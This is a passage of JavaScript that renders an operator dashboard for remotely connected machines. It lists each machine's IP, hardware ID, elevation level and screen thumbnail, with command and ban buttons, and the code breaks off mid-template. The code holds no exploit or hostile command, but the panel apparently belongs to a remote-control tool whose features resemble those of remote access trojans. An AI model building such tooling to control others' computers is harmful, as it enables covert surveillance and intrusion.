import {
  formatAgo,
  formatPing,
  countryToFlag,
  osBadge,
  archBadge,
  versionBadge,
  monitorsBadge,
  shortId,
} from "./viewUtils.js";

function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text;
  return div.innerHTML;
}

const ROW_SELECTOR = "[data-client-row]";

function pingTone(ms) {
  if (ms === null || ms === undefined) return "ping-unknown";
  if (ms < 30) return "ping-good";
  if (ms < 80) return "ping-mid";
  return "ping-bad";
}

function metaSeparator() {
  return `<span class="cv-mid" aria-hidden="true">·</span>`;
}

const FAUX_PALETTES = [
  ["#1e3a8a", "#0ea5e9", "#22d3ee"],
  ["#0f172a", "#475569", "#94a3b8"],
  ["#3b0764", "#a21caf", "#f472b6"],
  ["#064e3b", "#10b981", "#bbf7d0"],
  ["#7c2d12", "#ea580c", "#fdba74"],
  ["#082f49", "#0284c7", "#7dd3fc"],
];

function paletteFor(id) {
  const s = String(id || "");
  let h = 0;
  for (let i = 0; i < s.length; i++) h = (h * 31 + s.charCodeAt(i)) >>> 0;
  return FAUX_PALETTES[h % FAUX_PALETTES.length];
}

function fauxDesktopHtml(client, opts = {}) {
  const palette = paletteFor(client.id);
  const op = !client.online ? 0.3 : 1.0;
  const small = !!opts.small;
  const dotR = small ? 4 : 6;
  return `
    <div class="cv-faux" style="--p1:${palette[0]};--p2:${palette[1]};--p3:${palette[2]};--op:${op}">
      <div class="cv-faux-dots">
        <i style="width:${dotR}px;height:${dotR}px"></i>
        <i style="width:${dotR}px;height:${dotR}px"></i>
        <i style="width:${dotR}px;height:${dotR}px"></i>
      </div>
      <div class="cv-faux-window">
        <span style="width:78%"></span>
        <span style="width:62%"></span>
        <span style="width:48%"></span>
        <span style="width:36%"></span>
        <span style="width:24%"></span>
      </div>
      <div class="cv-faux-bar">
        <i></i><i></i><i></i><i></i><i></i>
      </div>
    </div>
  `;
}

function thumbHtml(client, { width, height, small = false } = {}) {
  if (client.thumbnail) {
    return `<img class="thumb-img cv-thumb-img" alt="preview" src="${escapeHtml(client.thumbnail)}" style="width:${width}px;height:${height}px;${client.online ? "" : "opacity:0.35"}">`;
  }
  return `<div class="cv-thumb" style="width:${width}px;height:${height}px;${client.online ? "" : "opacity:0.35"}">${fauxDesktopHtml(client, { small })}</div>`;
}

function statusDot(client) {
  return `<span class="cv-dot ${client.online ? "is-online" : "is-offline"}"></span>`;
}

function groupPillHtml(client) {
  const name = String(client.groupName || "").trim();
  if (!name) return "";
  const color = String(client.groupColor || "").trim() || "#64748b";
  return `<span class="cv-group" style="--gc:${escapeHtml(color)}">${escapeHtml(name)}</span>`;
}

function shortenCpu(raw = "") {
  return String(raw)
    .replace(/\(R\)|\(TM\)|\(tm\)|\(r\)/g, "")
    .replace(/\b(CPU|Processor|Genuine|Intel|AMD)\b/gi, (m) => (m.toUpperCase() === "INTEL" || m.toUpperCase() === "AMD" ? m : ""))
    .replace(/@\s*[\d.]+\s*GHz.*$/i, "")
    .replace(/\s+/g, " ")
    .trim()
    .slice(0, 38);
}

function shortOsLabel(osRaw = "") {
  const o = String(osRaw).toLowerCase();
  if (o.includes("windows 11")) return "Win 11";
  if (o.includes("windows 10")) return "Win 10";
  if (o.includes("windows")) return "Win";
  if (o.includes("ubuntu")) return "Ubuntu";
  if (o.includes("debian")) return "Debian";
  if (o.includes("arch")) return "Arch";
  if (o.includes("kali")) return "Kali";
  if (o.includes("fedora")) return "Fedora";
  if (o.includes("mac") || o.includes("darwin")) return "macOS";
  if (o.includes("linux")) return "Linux";
  return osRaw || "?";
}

export function createRenderer({
  grid,
  totalPill,
  pageLabel,
  openMenu,
  openModal,
  requestPreview,
  requestThumbnail,
  pingClient,
  userRole,
}) {
  const isViewer = userRole === "viewer";
  const MAX_ANIMATED_CARDS = 120;
  const INSERT_BATCH_SIZE = 40;
  const TOUCH_LONG_PRESS_MS = 520;
  const TOUCH_MOVE_CANCEL_PX = 10;
  let renderToken = 0;
  let gridDelegated = false;
  let currentLayout = (grid?.dataset.layout || "rows").toLowerCase();

  function getCardContainer() {
    if (currentLayout === "table") {
      return grid.querySelector("tbody.clients-table-body") || grid;
    }
    return grid;
  }

  function ensureLayoutScaffold() {
    if (currentLayout === "table") {
      if (grid.querySelector("table.clients-table")) return;
      grid.innerHTML = `
        <table class="clients-table">
          <thead>
            <tr>
              <th class="cv-th-check"></th>
              <th class="cv-th-star"></th>
              <th class="cv-th-thumb"></th>
              <th>Client</th>
              <th class="cv-th-status">Status</th>
              <th class="cv-th-last">Last seen</th>
              <th class="cv-th-system">System</th>
              <th class="cv-th-ping">Ping</th>
              <th class="cv-th-group">Group</th>
              <th class="cv-th-actions">Actions</th>
            </tr>
          </thead>
          <tbody class="clients-table-body"></tbody>
        </table>
      `;
    } else {
      const t = grid.querySelector("table.clients-table");
      if (t) t.remove();
    }
  }

  function setLayout(layout) {
    const next = ["rows", "table", "cards"].includes(layout) ? layout : "rows";
    if (currentLayout === next && grid.dataset.layout === next) return;
    currentLayout = next;
    grid.dataset.layout = next;
    grid.innerHTML = "";
    ensureLayoutScaffold();
  }

  /* ── Event delegation ─────────────────────────────────────────── */

  function setupGridDelegation() {
    if (gridDelegated) return;
    gridDelegated = true;

    grid.addEventListener("click", (e) => {
      const card = e.target.closest(ROW_SELECTOR);
      if (!card) return;
      const clientId = card.dataset.id;

      if (e.target.closest(".client-checkbox")) {
        e.stopPropagation();
        if (window.toggleClientSelection) window.toggleClientSelection(clientId);
        return;
      }

      const bookmarkBtn = e.target.closest(".bookmark-btn");
      if (bookmarkBtn) {
        e.stopPropagation();
        handleBookmarkClick(card, bookmarkBtn);
        return;
      }

      const copyBtn = e.target.closest(".copy-id-btn");
      if (copyBtn) {
        e.stopPropagation();
        const fullId = copyBtn.dataset.copy;
        if (fullId) {
          navigator.clipboard.writeText(fullId).then(() => {
            const icon = copyBtn.querySelector(".copy-id-icon");
            if (icon) { icon.className = "fa-solid fa-check copy-id-icon"; setTimeout(() => { icon.className = "fa-regular fa-copy copy-id-icon"; }, 1200); }
          }).catch(() => {});
        }
        return;
      }

      if (e.target.closest(".command-btn")) {
        e.stopPropagation();
        const rect = e.target.closest(".command-btn").getBoundingClientRect();
        openMenu(clientId, rect.right, rect.bottom);
        return;
      }

      if (e.target.closest(".ban-btn")) {
        e.stopPropagation();
        if (window.banClient) window.banClient(clientId);
        return;
      }

      if (e.target.closest(".kebab-btn")) {
        e.stopPropagation();
        const rect = e.target.closest(".kebab-btn").getBoundingClientRect();
        openMenu(clientId, rect.right, rect.bottom);
        return;
      }

      if (e.target.closest(".cv-ping-btn")) {
        e.stopPropagation();
        if (pingClient) pingClient(clientId);
        return;
      }

      if (e.target.closest(".client-tag-toggle")) {
        e.stopPropagation();
        handleTagToggle(card);
        return;
      }

      if (e.target.closest(".hw-toggle")) {
        e.stopPropagation();
        handleHwToggle(card);
        return;
      }

      if (e.target.closest(".cv-expand-btn")) {
        e.stopPropagation();
        handleExpandToggle(card);
        return;
      }

      const thumbImg = e.target.closest(".thumb-img");
      if (thumbImg) {
        if (thumbImg.src) openModal(thumbImg.src);
        return;
      }

      if (card._longPressTriggered) {
        card._longPressTriggered = false;
        e.preventDefault();
        e.stopPropagation();
        return;
      }
      if (e.target.closest("button")) return;
      if (e.target.closest(".client-checkbox")) return;
      const checkbox = card.querySelector(".client-checkbox");
      if (e.ctrlKey || e.metaKey || e.shiftKey) {
        if (checkbox && !checkbox.disabled) {
          checkbox.checked = !checkbox.checked;
          if (window.toggleClientSelection) window.toggleClientSelection(clientId);
        }
        return;
      }
      if (card.dataset.online !== "true") return;
      if (pingClient) pingClient(clientId);
      requestThumbnail(clientId);
    });

    grid.addEventListener("contextmenu", (e) => {
      const card = e.target.closest(ROW_SELECTOR);
      if (!card || isViewer) return;
      e.preventDefault();
      openMenu(card.dataset.id, e.clientX, e.clientY);
    });

    grid.addEventListener("pointerdown", (e) => {
      if (isViewer || e.pointerType !== "touch") return;
      if (e.target.closest("button") || e.target.closest(".client-checkbox")) return;
      const card = e.target.closest(ROW_SELECTOR);
      if (!card) return;
      card._longPressTriggered = false;
      card._pointerStartX = e.clientX;
      card._pointerStartY = e.clientY;
      clearTimeout(card._longPressTimer);
      card._longPressTimer = setTimeout(() => {
        card._longPressTriggered = true;
        openMenu(card.dataset.id, e.clientX, e.clientY);
      }, TOUCH_LONG_PRESS_MS);
    });

    grid.addEventListener("pointermove", (e) => {
      if (e.pointerType !== "touch") return;
      const card = e.target.closest(ROW_SELECTOR);
      if (!card || !card._longPressTimer) return;
      if (
        Math.abs(e.clientX - card._pointerStartX) > TOUCH_MOVE_CANCEL_PX ||
        Math.abs(e.clientY - card._pointerStartY) > TOUCH_MOVE_CANCEL_PX
      ) {
        clearTimeout(card._longPressTimer);
        card._longPressTimer = null;
      }
    });

    const clearLongPress = (e) => {
      if (e.pointerType !== "touch") return;
      const card = e.target.closest(ROW_SELECTOR);
      if (card) { clearTimeout(card._longPressTimer); card._longPressTimer = null; }
    };
    grid.addEventListener("pointerup", clearLongPress);
    grid.addEventListener("pointercancel", clearLongPress);
    grid.addEventListener("pointerleave", clearLongPress, true);
  }

  async function handleBookmarkClick(card, btn) {
    const id = card.dataset.id;
    const isBookmarked = card.dataset.bookmarked === "true";
    try {
      const res = await fetch(`/api/clients/${id}/bookmark`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ bookmarked: !isBookmarked }),
      });
      if (res.ok) {
        card.dataset.bookmarked = String(!isBookmarked);
        const icon = btn.querySelector("i");
        if (icon) {
          icon.classList.toggle("fa-solid", !isBookmarked);
          icon.classList.toggle("fa-regular", isBookmarked);
        }
        btn.classList.toggle("is-on", !isBookmarked);
        btn.title = !isBookmarked ? "Remove bookmark" : "Bookmark";
      }
    } catch (err) {
      console.error("bookmark toggle failed", err);
    }
  }

  function handleTagToggle(card) {
    const notePanel = card.querySelector(".client-tag-note");
    if (!notePanel) return;
    const expanded = notePanel.classList.toggle("hidden") === false;
    card.dataset.tagNoteExpanded = expanded ? "true" : "false";
    const tagToggle = card.querySelector(".client-tag-toggle");
    tagToggle?.setAttribute("aria-expanded", expanded ? "true" : "false");
    const chevron = tagToggle?.querySelector(".fa-chevron-up, .fa-chevron-down");
    if (chevron) {
      chevron.classList.toggle("fa-chevron-up", expanded);
      chevron.classList.toggle("fa-chevron-down", !expanded);
    }
  }

  function handleHwToggle(card) {
    const hwPanel = card.querySelector(".hw-panel");
    if (!hwPanel) return;
    const expanded = hwPanel.classList.toggle("hidden") === false;
    card.dataset.hwExpanded = expanded ? "true" : "false";
    const hwToggle = card.querySelector(".hw-toggle");
    hwToggle?.setAttribute("aria-expanded", expanded ? "true" : "false");
    const chevron = hwToggle?.querySelector(".fa-chevron-up, .fa-chevron-down");
    if (chevron) {
      chevron.classList.toggle("fa-chevron-up", expanded);
      chevron.classList.toggle("fa-chevron-down", !expanded);
    }
  }

  function handleExpandToggle(card) {
    const panel = card.querySelector(".cv-expand-panel");
    if (!panel) return;
    const expanded = panel.classList.toggle("hidden") === false;
    card.dataset.expanded = expanded ? "true" : "false";
    const btn = card.querySelector(".cv-expand-btn");
    btn?.setAttribute("aria-expanded", expanded ? "true" : "false");
  }

  function reorderCards(items) {
    const container = getCardContainer();
    const cards = container.querySelectorAll(ROW_SELECTOR);
    let needsReorder = cards.length !== items.length;
    if (!needsReorder) {
      for (let i = 0; i < items.length; i++) {
        if (cards[i]?.dataset?.id !== items[i].id) { needsReorder = true; break; }
      }
    }
    if (!needsReorder) return;
    items.forEach((client) => {
      const card = container.querySelector(`${ROW_SELECTOR}[data-id="${client.id}"]`);
      if (card) container.appendChild(card);
    });
  }

  function cardDigest(c) {
    return `${currentLayout}|${c.id}|${!!c.online}|${c.lastSeen}|${c.pingMs}|${c.host}|${c.user}|${c.os}|${c.arch}|${c.version}|${c.monitors}|${c.thumbnail}|${c.country}|${c.nickname}|${c.customTag}|${c.customTagNote}|${!!c.bookmarked}|${!!c.isAdmin}|${c.elevation}|${c.cpu}|${c.gpu}|${c.ram}|${c.hwid}|${c.disconnectReason}|${c.disconnectDetail}|${c.groupId}|${c.groupName}|${c.groupColor}|${!!c.notificationsMuted}`;
  }

  function renderMerge(data, options = {}) {
    setupGridDelegation();
    ensureLayoutScaffold();
    const container = getCardContainer();
    const { reorder = false } = options;
    totalPill.textContent = `${data.online ?? data.total} online / ${data.total} total`;
    const totalPages = Math.max(1, Math.ceil(data.total / data.pageSize));
    pageLabel.textContent = `Page ${data.page} of ${totalPages}`;
    prevBtnState(data.page, totalPages);

    const items = data.items || [];
    const seen = new Set();
    const newClients = [];
    const renderId = ++renderToken;
    const prefersReducedMotion =
      typeof window !== "undefined" &&
      window.matchMedia &&
      window.matchMedia("(prefers-reduced-motion: reduce)").matches;

    const hadCards = container.querySelectorAll(ROW_SELECTOR).length > 0;

    const uninstallingIds = window.__uninstallingClientIds;

    items.forEach((client) => {
      seen.add(client.id);
      if (uninstallingIds && uninstallingIds.has(client.id)) return;
      const existing = container.querySelector(`${ROW_SELECTOR}[data-id="${client.id}"]`);
      if (existing) {
        if (existing.classList.contains("card-uninstalling")) return;
        const digest = cardDigest(client);
        if (existing._cardDigest === digest) return;
        existing._cardDigest = digest;
        updateCard(existing, client);
        return;
      }
      newClients.push(client);
    });

    Array.from(container.querySelectorAll(ROW_SELECTOR))
      .filter((el) => !seen.has(el.dataset.id) && !el.classList.contains("card-uninstalling"))
      .forEach((el) => el.remove());

    if (reorder) {
      reorderCards(items);
    }

    if (newClients.length === 0) return;

    const allowAnimation = !hadCards && !prefersReducedMotion && items.length <= 1000 && currentLayout !== "table";
    const animateLimit = Math.min(newClients.length, MAX_ANIMATED_CARDS);

    let idx = 0;
    const insertBatch = () => {
      if (renderId !== renderToken) return;
      const fragment = document.createDocumentFragment();
      for (
        let batch = 0;
        batch < INSERT_BATCH_SIZE && idx < newClients.length;
        batch++, idx++
      ) {
        const client = newClients[idx];
        const shouldAnimate = allowAnimation && idx < animateLimit;
        const card = buildCard(client, {
          animate: shouldAnimate,
          delayIndex: idx,
        });
        fragment.appendChild(card);
      }
      container.appendChild(fragment);
      if (idx < newClients.length) {
        requestAnimationFrame(insertBatch);
        return;
      }
      reorderCards(items);
    };

    insertBatch();
  }

  function prevBtnState(currentPage, totalPages) {
    const prevBtn = document.getElementById("prev");
    const nextBtn = document.getElementById("next");
    if (prevBtn) prevBtn.disabled = currentPage <= 1;
    if (nextBtn) nextBtn.disabled = currentPage >= totalPages;
  }

  function setSharedDataset(el, client) {
    el.dataset.clientRow = currentLayout;
    el.dataset.id = client.id;
    el.dataset.hwid = client.hwid || "";
    el.dataset.online = String(!!client.online);
    el.dataset.os = String(client.os || "").toLowerCase();
    el.dataset.nickname = String(client.nickname || "");
    el.dataset.customTag = String(client.customTag || "");
    el.dataset.bookmarked = String(!!client.bookmarked);
    el.dataset.notificationsMuted = String(!!client.notificationsMuted);
    el.dataset.admin = String(!!client.isAdmin);
    el.dataset.groupId = String(client.groupId || "");
    el.dataset.groupName = String(client.groupName || "");
    el.dataset.groupColor = String(client.groupColor || "");
    el._customTagNote = String(client.customTagNote || "");
    if (!client.bookmarked && client.groupColor) {
      el.style.setProperty("--group-color", client.groupColor);
    } else {
      el.style.removeProperty("--group-color");
    }
  }

  function buildCard(client, options = {}) {
    const node =
      currentLayout === "table"
        ? buildRowB(client, options)
        : currentLayout === "cards"
          ? buildCardC(client, options)
          : buildRowA(client, options);

    node._cardDigest = cardDigest(client);

    if (options.animate && currentLayout !== "table") {
      node.classList.add("card-animate");
      node.style.animationDelay = `${(options.delayIndex || 0) * 0.05}s`;
      node.style.opacity = "0";
      node.style.transform = "translateY(10px)";
      if (typeof anime !== "undefined") {
        requestAnimationFrame(() => {
          anime({
            targets: node,
            opacity: [0, 1],
            translateY: [10, 0],
            duration: 400,
            easing: "easeOutQuad",
          });
        });
      }
    }

    return node;
  }

  function updateCard(card, client) {
    const wasChecked = card.querySelector(".client-checkbox")?.checked || false;
    const wasTagNoteExpanded = card.dataset.tagNoteExpanded === "true";
    const wasHwExpanded = card.dataset.hwExpanded === "true";
    const wasExpanded = card.dataset.expanded === "true";

    const fresh = buildCard(client, { animate: false });

    fresh.dataset.tagNoteExpanded = wasTagNoteExpanded ? "true" : "false";
    fresh.dataset.hwExpanded = wasHwExpanded ? "true" : "false";
    fresh.dataset.expanded = wasExpanded ? "true" : "false";
    if (wasTagNoteExpanded) fresh.querySelector(".client-tag-note")?.classList.remove("hidden");
    if (wasHwExpanded) fresh.querySelector(".hw-panel")?.classList.remove("hidden");
    if (wasExpanded) fresh.querySelector(".cv-expand-panel")?.classList.remove("hidden");

    const cb = fresh.querySelector(".client-checkbox");
    if (cb) {
      const isSelected = typeof window.isClientSelected === "function"
        ? window.isClientSelected(client.id)
        : false;
      if ((wasChecked || isSelected) && client.online) cb.checked = true;
    }

    card.replaceWith(fresh);
  }

  /* ── VARIANT A: Row cards ─────────────────────────────────────── */

  function buildRowA(client, _options) {
    const article = document.createElement("article");
    article.className = `cv-row ${client.online ? "" : "cv-offline"} ${client.bookmarked ? "is-bookmarked" : ""}`;
    setSharedDataset(article, client);

    const os = osBadge(client.os || "unknown");
    const arch = archBadge(client.arch || "");
    const ver = versionBadge(client.version || "");
    const mons = monitorsBadge(client.monitors);
    const deviceId = shortId(client.id);
    const hwid = shortId(client.hwid || "");
    const nickname = String(client.nickname || "").trim();
    const customTag = String(client.customTag || "").trim();
    const customTagNote = String(client.customTagNote || "");
    const displayName = nickname || client.host || deviceId;
    const userLine = client.user || client.host || deviceId;
    const hasTagNote = customTag.length > 0 && customTagNote.length > 0;
    const hasHwInfo = !!(client.cpu || client.gpu || client.ram);
    const verLatest = String(client.version || "").startsWith("2.0.");

    const metaParts = [
      `<span class="cv-os cv-tone-${os.tone}"><i class="fa ${os.icon}"></i> ${escapeHtml(shortOsLabel(client.os))}</span>`,
      `<span class="cv-arch cv-tone-${arch.tone}">${escapeHtml(arch.label)}</span>`,
      `<span class="cv-ver"><i class="fa ${ver.icon}"></i> ${escapeHtml(ver.label)}</span>`,
      `<span class="cv-mons"><i class="fa fa-display"></i> ${client.monitors || 1}</span>`,
      nickname && client.host && nickname !== client.host ? `<span class="cv-host"><i class="fa-solid fa-laptop"></i> ${escapeHtml(client.host)}</span>` : "",
      client.ip ? `<span class="cv-ip cv-mono"><i class="fa-solid fa-network-wired"></i> ${escapeHtml(client.ip)}</span>` : "",
      hwid ? `<span class="cv-hwid cv-mono" title="HWID ${escapeHtml(client.hwid || "")}"><i class="fa-solid fa-fingerprint"></i> ${escapeHtml(hwid)}</span>` : "",
    ].filter(Boolean);
    const meta = metaParts.join(metaSeparator());

    article.innerHTML = `
      <span class="cv-edge"></span>
      <label class="cv-checkbox">
        <input type="checkbox" class="client-checkbox" data-id="${escapeHtml(client.id)}" ${client.online ? "" : "disabled"}>
        <span class="cv-checkbox-box"><i class="fa-solid fa-check"></i></span>
      </label>
      <button class="bookmark-btn cv-star ${client.bookmarked ? "is-on" : ""}" data-id="${escapeHtml(client.id)}" title="${client.bookmarked ? "Remove bookmark" : "Bookmark"}">
        <i class="fa-${client.bookmarked ? "solid" : "regular"} fa-star"></i>
      </button>
      <div class="cv-thumb-wrap">${thumbHtml(client, { width: 168, height: 96, small: false })}</div>
      <div class="cv-primary">
        <div class="cv-name-line">
          ${statusDot(client)}
          <span class="cv-flag">${countryToFlag(client.country)}</span>
          <span class="cv-name">${escapeHtml(displayName)}</span>
          ${client.isAdmin ? `<span class="cv-mini-pill cv-pill-admin" title="Admin"><i class="fa-solid fa-shield-halved"></i></span>` : ""}
          ${client.elevation === "system" ? `<span class="cv-mini-pill cv-pill-system" title="SYSTEM"><i class="fa-solid fa-gear"></i></span>` : ""}
          ${client.elevation === "trustedinstaller" ? `<span class="cv-mini-pill cv-pill-ti" title="TrustedInstaller"><i class="fa-solid fa-lock"></i></span>` : ""}
          ${client.notificationsMuted ? `<span class="cv-mini-pill cv-pill-muted" title="Notifications muted"><i class="fa-solid fa-bell-slash"></i></span>` : ""}
        </div>
        <div class="cv-user-line"><i class="fa-solid fa-user"></i> ${escapeHtml(userLine)}</div>
        <div class="cv-meta-line">${meta}</div>
        ${customTag ? `<button type="button" class="client-tag-toggle cv-tag ${hasTagNote ? "has-note" : ""}" ${hasTagNote ? `aria-expanded="false"` : `disabled aria-disabled="true"`}><i class="fa-solid fa-tag"></i> ${escapeHtml(customTag)}${hasTagNote ? ` <i class="fa-solid fa-chevron-down"></i>` : ""}</button>` : ""}
        ${hasTagNote ? `<div class="client-tag-note hidden">${escapeHtml(customTagNote)}</div>` : ""}
      </div>
      <div class="cv-time">
        <span class="cv-time-line"><i class="fa-regular fa-clock"></i> ${formatAgo(client.lastSeen)}</span>
        <span class="cv-ping-line ${pingTone(client.pingMs)}"><i class="fa-solid fa-satellite-dish"></i> ${formatPing(client.pingMs)}</span>
      </div>
      <div class="cv-group-cell">${groupPillHtml(client) || `<span class="cv-group-empty">—</span>`}</div>
      <div class="cv-spacer"></div>
      <div class="cv-actions">
        ${isViewer ? "" : `<button class="command-btn cv-btn-primary" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-terminal"></i><span>Commands</span></button>`}
        <button class="cv-icon-btn cv-ping-btn" title="Ping" ${client.online ? "" : "disabled"}><i class="fa-solid fa-satellite-dish"></i></button>
        ${isViewer ? "" : `<button class="cv-icon-btn cv-icon-danger ban-btn" title="Ban IP" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-ban"></i></button>`}
        <button class="cv-icon-btn cv-expand-btn" title="More info" aria-expanded="false"><i class="fa-solid fa-chevron-down"></i></button>
      </div>
      <div class="cv-expand-panel hidden">
        <div class="cv-expand-grid">
          <div class="cv-field"><span class="cv-field-label">ID</span><span class="cv-field-value cv-mono copy-id-btn" data-copy="${escapeHtml(client.id)}" title="Copy full ID">${escapeHtml(deviceId)} <i class="fa-regular fa-copy copy-id-icon"></i></span></div>
          <div class="cv-field"><span class="cv-field-label">Hardware ID</span><span class="cv-field-value cv-mono">${escapeHtml(hwid || "—")}</span></div>
          <div class="cv-field"><span class="cv-field-label">IP</span><span class="cv-field-value cv-mono">${escapeHtml(client.ip || "—")}</span></div>
          <div class="cv-field"><span class="cv-field-label">OS</span><span class="cv-field-value">${escapeHtml(client.os || "Unknown")} ${escapeHtml(arch.label)}</span></div>
          <div class="cv-field"><span class="cv-field-label">CPU</span><span class="cv-field-value">${escapeHtml(client.cpu || "—")}</span></div>
          <div class="cv-field"><span class="cv-field-label">RAM</span><span class="cv-field-value">${escapeHtml(client.ram || "—")}</span></div>
          ${client.gpu ? `<div class="cv-field cv-field-wide"><span class="cv-field-label">GPU</span><span class="cv-field-value">${escapeHtml(client.gpu)}</span></div>` : ""}
          ${!verLatest && client.version ? `<div class="cv-field"><span class="cv-field-label">Version</span><span class="cv-field-value cv-warn">v${escapeHtml(client.version)} (outdated)</span></div>` : ""}
        </div>
      </div>
    `;
    return article;
  }

  /* ── VARIANT B: Dense table ───────────────────────────────────── */

  function buildRowB(client, _options) {
    const tr = document.createElement("tr");
    tr.className = `cv-trow ${client.online ? "" : "cv-offline"} ${client.bookmarked ? "is-bookmarked" : ""}`;
    setSharedDataset(tr, client);

    const os = osBadge(client.os || "unknown");
    const arch = archBadge(client.arch || "");
    const deviceId = shortId(client.id);
    const nickname = String(client.nickname || "").trim();
    const displayName = nickname || client.host || deviceId;
    const userLine = client.user || client.host || deviceId;

    tr.innerHTML = `
      <td class="cv-td-check">
        <label class="cv-checkbox">
          <input type="checkbox" class="client-checkbox" data-id="${escapeHtml(client.id)}" ${client.online ? "" : "disabled"}>
          <span class="cv-checkbox-box"><i class="fa-solid fa-check"></i></span>
        </label>
      </td>
      <td class="cv-td-star">
        <button class="bookmark-btn cv-star ${client.bookmarked ? "is-on" : ""}" data-id="${escapeHtml(client.id)}" title="${client.bookmarked ? "Remove bookmark" : "Bookmark"}">
          <i class="fa-${client.bookmarked ? "solid" : "regular"} fa-star"></i>
        </button>
      </td>
      <td class="cv-td-thumb">${thumbHtml(client, { width: 80, height: 50, small: true })}</td>
      <td class="cv-td-client">
        <div class="cv-tcell-client">
          <span class="cv-flag">${countryToFlag(client.country)}</span>
          <div class="cv-tcell-stack">
            <span class="cv-tcell-name-row">
              <span class="cv-name">${escapeHtml(displayName)}</span>
              ${client.isAdmin ? `<span class="cv-mini-pill cv-pill-admin" title="Admin"><i class="fa-solid fa-shield-halved"></i></span>` : ""}
              ${client.elevation === "system" ? `<span class="cv-mini-pill cv-pill-system" title="SYSTEM"><i class="fa-solid fa-gear"></i></span>` : ""}
              ${client.elevation === "trustedinstaller" ? `<span class="cv-mini-pill cv-pill-ti" title="TI"><i class="fa-solid fa-lock"></i></span>` : ""}
              ${client.notificationsMuted ? `<span class="cv-mini-pill cv-pill-muted" title="Notifications muted"><i class="fa-solid fa-bell-slash"></i></span>` : ""}
            </span>
            <span class="cv-user-line cv-mono"><i class="fa-solid fa-user"></i> ${escapeHtml(userLine)}${client.ip ? `<span class="cv-mid">·</span><i class="fa-solid fa-network-wired"></i> ${escapeHtml(client.ip)}` : ""}</span>
          </div>
        </div>
      </td>
      <td class="cv-td-status">
        <span class="cv-status-cell">${statusDot(client)} ${client.online ? "Online" : "Offline"}</span>
      </td>
      <td class="cv-td-last cv-tab-num">${formatAgo(client.lastSeen)}</td>
      <td class="cv-td-system">
        <span class="cv-system-cell"><span class="cv-os cv-tone-${os.tone}"><i class="fa ${os.icon}"></i> ${escapeHtml(shortOsLabel(client.os))}</span> <span class="cv-arch-chip cv-tone-${arch.tone}">${escapeHtml(arch.label)}</span></span>
      </td>
      <td class="cv-td-ping cv-tab-num cv-mono ${pingTone(client.pingMs)}">${formatPing(client.pingMs)}</td>
      <td class="cv-td-group">${groupPillHtml(client) || `<span class="cv-group-empty">—</span>`}</td>
      <td class="cv-td-actions">
        <div class="cv-actions cv-actions-table">
          ${isViewer ? "" : `<button class="command-btn cv-btn-primary cv-btn-sm" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-terminal"></i><span>Commands</span></button>`}
          ${isViewer ? "" : `<button class="cv-icon-btn cv-icon-sm kebab-btn" title="More" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-ellipsis-vertical"></i></button>`}
        </div>
      </td>
    `;
    return tr;
  }

  /* ── VARIANT C: Card wall ─────────────────────────────────────── */

  function buildCardC(client, _options) {
    const article = document.createElement("article");
    article.className = `cv-card ${client.online ? "" : "cv-offline"} ${client.bookmarked ? "is-bookmarked" : ""}`;
    setSharedDataset(article, client);

    const os = osBadge(client.os || "unknown");
    const arch = archBadge(client.arch || "");
    const ver = versionBadge(client.version || "");
    const deviceId = shortId(client.id);
    const hwidShort = shortId(client.hwid || "");
    const nickname = String(client.nickname || "").trim();
    const customTag = String(client.customTag || "").trim();
    const displayName = nickname || client.host || deviceId;
    const userLine = client.user || "unknown";
    const verLatest = String(client.version || "").startsWith("2.0.");
    const hasGroup = !!String(client.groupName || "").trim();
    const showHost = nickname && client.host && nickname !== client.host;
    const cpuShort = client.cpu ? shortenCpu(client.cpu) : "";

    const metaParts = [
      `<span class="cv-card-meta-bit cv-tone-${os.tone}"><i class="fa ${os.icon}"></i> ${escapeHtml(shortOsLabel(client.os))}</span>`,
      `<span class="cv-card-meta-bit cv-tone-${arch.tone}">${escapeHtml(arch.label)}</span>`,
      `<span class="cv-card-meta-bit"><i class="fa fa-display"></i> ${client.monitors || 1}</span>`,
      client.version ? `<span class="cv-card-meta-bit ${verLatest ? "" : "cv-warn"}"><i class="fa fa-tag"></i> v${escapeHtml(client.version)}</span>` : "",
    ].filter(Boolean).join("");

    const elevationBadges = [
      client.isAdmin ? `<span class="cv-mini-pill cv-pill-admin" title="Admin"><i class="fa-solid fa-shield-halved"></i></span>` : "",
      client.elevation === "system" ? `<span class="cv-mini-pill cv-pill-system" title="SYSTEM"><i class="fa-solid fa-gear"></i></span>` : "",
      client.elevation === "trustedinstaller" ? `<span class="cv-mini-pill cv-pill-ti" title="TrustedInstaller"><i class="fa-solid fa-lock"></i></span>` : "",
      client.notificationsMuted ? `<span class="cv-mini-pill cv-pill-muted" title="Notifications muted"><i class="fa-solid fa-bell-slash"></i></span>` : "",
    ].join("");

    article.innerHTML = `
      <header class="cv-card-header">
        ${thumbHtml(client, { width: 290, height: 130, small: false })}
        <label class="cv-checkbox cv-card-check">
          <input type="checkbox" class="client-checkbox" data-id="${escapeHtml(client.id)}" ${client.online ? "" : "disabled"}>
          <span class="cv-checkbox-box"><i class="fa-solid fa-check"></i></span>
        </label>
        <div class="cv-card-chips">
          <button class="bookmark-btn cv-chip-btn ${client.bookmarked ? "is-on" : ""}" data-id="${escapeHtml(client.id)}" title="${client.bookmarked ? "Remove bookmark" : "Bookmark"}">
            <i class="fa-${client.bookmarked ? "solid" : "regular"} fa-star"></i>
          </button>
          ${isViewer ? "" : `<button class="cv-chip-btn kebab-btn" title="More" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-ellipsis-vertical"></i></button>`}
        </div>
        <div class="cv-card-status">
          ${statusDot(client)} <span>${client.online ? "Online" : "Offline"}</span> <span class="cv-mid">·</span> <span class="cv-card-ago">${formatAgo(client.lastSeen)}</span>
        </div>
        <div class="cv-card-ping ${pingTone(client.pingMs)}">
          <i class="fa-solid fa-satellite-dish"></i> <span class="cv-mono">${formatPing(client.pingMs)}</span>
        </div>
      </header>
      <div class="cv-card-body">
        <div class="cv-name-line">
          <span class="cv-flag">${countryToFlag(client.country)}</span>
          <span class="cv-name">${escapeHtml(displayName)}</span>
          ${elevationBadges}
        </div>
